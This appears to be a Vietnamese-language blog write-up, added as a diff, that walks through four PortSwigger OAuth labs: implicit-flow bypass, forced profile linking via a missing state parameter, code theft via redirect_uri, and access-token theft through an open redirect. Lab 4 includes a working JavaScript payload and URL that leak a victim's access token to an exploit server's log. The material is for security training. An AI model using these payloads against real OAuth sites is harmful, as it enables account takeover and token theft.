@@ -1,0 +1,213 @@
+---
+title: "OAuth Authentication Labs — PortSwigger Web Security Academy"
+description: "Write-up chi tiết các bài lab về lỗ hổng xác thực OAuth 2.0 trên PortSwigger — bao gồm khai thác implicit flow, CSRF liên kết tài khoản, chiếm đoạt mã qua redirect_uri và đánh cắp access token qua open redirect."
+date: "2026-05-16"
+category: "writeup"
+tags: ["oauth2", "portswigger", "web-security", "csrf", "open-redirect", "ssrf"]
+thumbnail: ""
+external_link: ""
+---
+
+## Lab 1: Authentication bypass via OAuth implicit flow
+
+Mục tiêu của bài lab này là đăng nhập thành công tài khoản carlos.
+
+Trang web có form login.
+
+![Lab 1 - Login form](/images/writeups/oauth-authentication-labs/image1.png)
+
+Sau khi đăng nhập, trang web gửi một request tới OAuth Provider.
+
+OAuth Provider (Nhà cung cấp OAuth) là hệ thống hoặc dịch vụ nắm giữ tài khoản và dữ liệu của người dùng, cho phép các ứng dụng bên thứ ba truy cập các dữ liệu đó một cách an toàn mà không cần người dùng phải chia sẻ mật khẩu.
+
+Trong request này có trường response_type=token. Nó cho biết app đang dùng OAuth Implicit Flow, trong mô hình này, OAuth server sẽ trả access_token trực tiếp cho browser.
+
+![Lab 1 - OAuth request](/images/writeups/oauth-authentication-labs/image2.png)
+
+Phía sau là trang xác thực và request tương ứng.
+
+![Lab 1 - Auth page](/images/writeups/oauth-authentication-labs/image3.png)
+
+![Lab 1 - Auth request](/images/writeups/oauth-authentication-labs/image4.png)
+
+Tuy nhiên ở đây, phía client-side gửi trường email lên server, và server lại tin tưởng vào nó mà không có cơ chế xác thực, ta thử nghiệm điều này bằng cách thay đổi trường email sang carlos và gửi lại request.
+
+![Lab 1 - Change email](/images/writeups/oauth-authentication-labs/image5.png)
+
+Khai thác thành công, ta đã được chuyển hướng sang trang chủ của carlos. Tiếp theo ta chuyển request này lên browser và solve lab.
+
+![Lab 1 - Solved](/images/writeups/oauth-authentication-labs/image6.png)
+
+## Lab 2: Forced OAuth profile linking
+
+Mục tiêu của bài lab này là liên kết hồ sơ mạng xã hội của bạn với tài khoản người dùng quản trị trên trang web blog, sau đó truy cập vào admin và xóa tài khoản đó carlos.
+
+Trang web có tính năng Attach a social profile, tuy nhiên request tương ứng của chức năng này đang bị thiếu tham số STATE.
+
+![Lab 2 - Missing state](/images/writeups/oauth-authentication-labs/image7.png)
+
+Trong giao thức OAuth 2.0, tham số state đóng vai trò là một token CSRF. Việc thiếu tham số này cho phép kẻ tấn công thực hiện kỹ thuật OAuth Account Linking CSRF.
+
+Client-side đã không kiểm tra xem mã code trả về có thực sự bắt nguồn từ một yêu cầu do chính người dùng hiện tại khởi tạo hay không.
+
+![Lab 2 - OAuth flow](/images/writeups/oauth-authentication-labs/image8.png)
+
+Từ đây, ta sẽ thực hiện một cuộc tấn công CSRF bằng cách tạo một đoạn HTML chưa thẻ ifame để gửi cho Admin. Khi Admin ấn vào link này:
+
+- Trình duyệt của Admin tự động gửi mã code ta tới server của ứng dụng.
+- Server ứng dụng nhận mã và liên kết hồ sơ mạng xã hội của ta vào tài khoản Admin.
+
+Thực hiện khai thác bằng cách bật Intercept và chặn request /oauth-linking?code=HlhWFd-iz8KvH0oOSc7gUaQjSTjUnXDl2jAn_CZeoHc ( vì đây là mã dùng một lần ), ta sẽ coppy lấy code này và đưa vào trong mã khai thác ( sau đó drop request /oauth-linking )
+
+![Lab 2 - Intercept code](/images/writeups/oauth-authentication-labs/image9.png)
+
+![Lab 2 - Exploit code](/images/writeups/oauth-authentication-labs/image10.png)
+
+Gửi mã khai thác, hệ thống sẽ mô phỏng nạn nhân ( admin ) ấn vào link, khi đó hồ sơ mạng xã hội của ta sẽ liên kết với tài khoản admin.
+
+Xoá người dùng carlos -> slove lab
+
+![Lab 2 - Delete carlos](/images/writeups/oauth-authentication-labs/image11.png)
+
+![Lab 2 - Solved](/images/writeups/oauth-authentication-labs/image12.png)
+
+## Lab 3: OAuth account hijacking via redirect_uri
+
+Mục tiêu của bài lab này là xoá được tài khoản carlos dưới danh nghĩa admin.
+
+Trang web có cơ chế SSO Login, điều này cho phép người dùng không cần nhập tài khoản mật khẩu kể từ lần đăng nhập thứ 2.
+
+![Lab 3 - SSO Login](/images/writeups/oauth-authentication-labs/image13.png)
+
+Trong burp, request tương ứng với tính năng trên là GET /auth?.....
+
+![Lab 3 - Auth request](/images/writeups/oauth-authentication-labs/image14.png)
+
+Đây là yêu cầu của ứng dụng tới oauth server nhằm mục đích xác thực xem người dùng này có đúng là chủ tài khoản không, hãy xác thực họ và xin quyền truy cập. Mã phản hồi 302 cho thấy xác thực thành công. Oauth server trả về một mã xác thực dùng một lần.
+
+![Lab 3 - 302 redirect](/images/writeups/oauth-authentication-labs/image15.png)
+
+Ngay sau đó, mã này sẽ được đưa vào GET /oauth-callback. Đây là endpoint tiếp nhận kết quả của Client App. Nó mang code này đi đổi lấy token đăng nhập ở phía Back-end (người dùng không nhìn thấy), xác nhận danh tính của bạn hợp lệ và trả về giao diện trang web đăng nhập thành công (200 OK).
+
+![Lab 3 - Callback](/images/writeups/oauth-authentication-labs/image16.png)
+
+Tuy nhiên ở đây, ta chú ý đến trường redirect_uri trong GET /auth, đây là domain mà ta sẽ truy cập đến sau khi xác thực thành công, liệu giá trị này có an toàn ?. Ta kiểm thử điều này bằng cách thay đổi nó và gửi lại request.
+
+![Lab 3 - Modify redirect_uri](/images/writeups/oauth-authentication-labs/image17.png)
+
+Thành công ! Vậy ta hoàn toàn có thể lấy được mã code của bất kỳ tài khoản nào bằng cách chuyển hướng redirect_uri về máy chủ của ta. Thử nghiệm trước bằng máy chủ của ta.
+
+![Lab 3 - Exploit server test](/images/writeups/oauth-authentication-labs/image18.png)
+
+![Lab 3 - Redirect result](/images/writeups/oauth-authentication-labs/image19.png)
+
+Tiếp theo, ta sẽ thực hiện khai thác bằng cách tạo một đoạn mã Irame và gửi nó cho nạn nhân thông qua máy chủ khai thác.
+
+![Lab 3 - Iframe exploit](/images/writeups/oauth-authentication-labs/image20.png)
+
+Mã code của nạn nhân ( admin ) đã được gửi về /log.
+
+![Lab 3 - Log code](/images/writeups/oauth-authentication-labs/image21.png)
+
+Có được code này, ta thay nó vào /callback để đăng nhập vào trang của admin.
+
+![Lab 3 - Use code](/images/writeups/oauth-authentication-labs/image22.png)
+
+Thành công !, truy cập vào trang admin và xoá tài khoản carlos -> solve lab ( trước đó bạn cần đăng xuất wiener vì ngăn chặn xung đột session.
+
+![Lab 3 - Admin panel](/images/writeups/oauth-authentication-labs/image23.png)
+
+![Lab 3 - Solved](/images/writeups/oauth-authentication-labs/image24.png)
+
+## Lab 4: Stealing OAuth access tokens via an open redirect
+
+Mục tiêu của bài lab là lấy được API Key của Admin.
+
+![Lab 4 - Overview](/images/writeups/oauth-authentication-labs/image25.png)
+
+Trang web vẫn sử dụng endpoint GET /auth để lấy code từ máy chủ xác thực. Ta sẽ tìm lỗi Open Redirect trong trường redirect_uri.
+
+![Lab 4 - Auth request](/images/writeups/oauth-authentication-labs/image26.png)
+
+Đã có lỗi xảy ra, điều này cho thấy hệ thống đã có fillter bằng whitelist. Tuy nhiên, trang web lại bị dính lỗi path traversal, ta kiểm thử bằng cách nhập ../ post?postId=1 để vào một bài post.
+
+![Lab 4 - Path traversal test](/images/writeups/oauth-authentication-labs/image27.png)
+
+![Lab 4 - Path traversal result](/images/writeups/oauth-authentication-labs/image28.png)
+
+Đã vào được bài đăng.
+
+Vậy là tại /auth, ta không thể chỉnh giá trị redirect_uri về server của ta, nhưng ta có thể điều hướng nó về bất cứ đâu trong domain của trang web. Vậy trong trang web này có endpoint nào chưa một trường tương tự như redirect_uri và bị lỗi Open Redirect hay không ?
+
+Ta phát hiện trong tính năng chuyển sang bài viết tiếp theo, có chứa tham số path chứa giá trị là một đường dẫn
+
+![Lab 4 - Next post feature](/images/writeups/oauth-authentication-labs/image29.png)
+
+![Lab 4 - Path parameter](/images/writeups/oauth-authentication-labs/image30.png)
+
+Và trường này bị lỗi Open Redirect, ta kiểm thử điều này bằng cách thay đổi nó và gửi lại request.
+
+![Lab 4 - Open redirect test](/images/writeups/oauth-authentication-labs/image31.png)
+
+Vậy ta đã kết hợp đủ 2 điều kiện:
+
+- Trang web bị Open Redirect ở endpoint GET /post/next.
+- Lỗi path traversal cho phép điều hướng trang web từ /auth về url bất kì thuộc domain.
+- Từ đây , ta có thể điều hướng redirect_uri trong /auth trở về /post/next. Thay trường path này bằng url của máy chủ khai thác. Khi đó, oauth code sẽ được gửi về máy chủ của ta !
+
+Thử nghiệm bằng `https://oauth-0a5900e103d5667480eb069602cc00b8.oauth-server.net/auth?client_id=rzd4r9hwdbs2ycwbzty8d&redirect_uri=https://0a450068034f66c3800208c4004a002c.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a6d0058032e663a809707110109009e.exploit-server.net&response_type=token&nonce=-802410778&scope=openid%20profile%20email`
+
+![Lab 4 - Redirect chain test](/images/writeups/oauth-authentication-labs/image32.png)
+
+Chuyển hướng thành công về máy chủ của ta, tuy nhiên trong log không có code, nguyên nhân là do nó đã bị kẹt trong URL Fragment (sau dấu # ). Những thứ sau dấu # sẽ không được gửi lên server,  nên nó không xuất hiện trong access log.
+
+![Lab 4 - Missing token in log](/images/writeups/oauth-authentication-labs/image33.png)
+
+Tuy nhiên ta hoàn toàn có thể đối URL Fragment thành Query Parameter ( dấu ? ), khi đó, trình duyệt bắt buộc phải gửi toàn bộ chuỗi này lên mạng. Máy chủ nhận được và ghi thẳng vào Access Log. Đoạn mã dưới đây sẽ thực hiện điều đó.
+
+```html
+<script>
+window.location = '/?'+document.location.hash.substr(1)
+</script>
+```
+
+Cuối cùng, ta sẽ hoàn thiện scripts khai thác hoàn chỉnh bằng một câu lệnh điều kiện.
+
+```html
+<script>
+if (!document.location.hash) {
+// BƯỚC 1: Đẩy nạn nhân đi lấy Token
+window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+} else {
+// BƯỚC 2: Nạn nhân quay lại cùng Token -> Ghi vào Log
+window.location = '/?'+document.location.hash.substr(1)
+}
+</script>
+```
+
+Quy trình hoạt động của scripts như sau:
+
+Admin mở link của bạn -> Chưa có dấu # -> Script đẩy Admin sang Máy chủ OAuth ->  Máy chủ OAuth cấp Token rồi gửi qua lỗ hổng Open Redirect để điều hướng Admin quay lại link của bạn.
+
+Admin bị đá quay lại kèm theo dấu #access_token=... -> Script thấy đã có dấu # nên lập tức cắt chuỗi, đổi thành dấu ? để ép trình duyệt gửi Token lên máy chủ và ghi thẳng vào Access Log.
+
+![Lab 4 - Final exploit](/images/writeups/oauth-authentication-labs/image34.png)
+
+Access token đã được gửi về /log.
+
+![Lab 4 - Token in log](/images/writeups/oauth-authentication-labs/image35.png)
+
+Có được Access token. Ta thay nó vào trường Authorization trong GET /me để đăng nhập vào admin.
+
+![Lab 4 - Use token](/images/writeups/oauth-authentication-labs/image36.png)
+
+![Lab 4 - Admin API Key](/images/writeups/oauth-authentication-labs/image37.png)
+
+Thành công, lấy được API Key của admin -> solve lab.
+
+![Lab 4 - Solved](/images/writeups/oauth-authentication-labs/image38.png)
+
+## Tham khảo
+
+- [PortSwigger — OAuth Authentication](https://portswigger.net/web-security/oauth)
+- [PortSwigger — OAuth Authentication Labs](https://portswigger.net/web-security/oauth#labs)
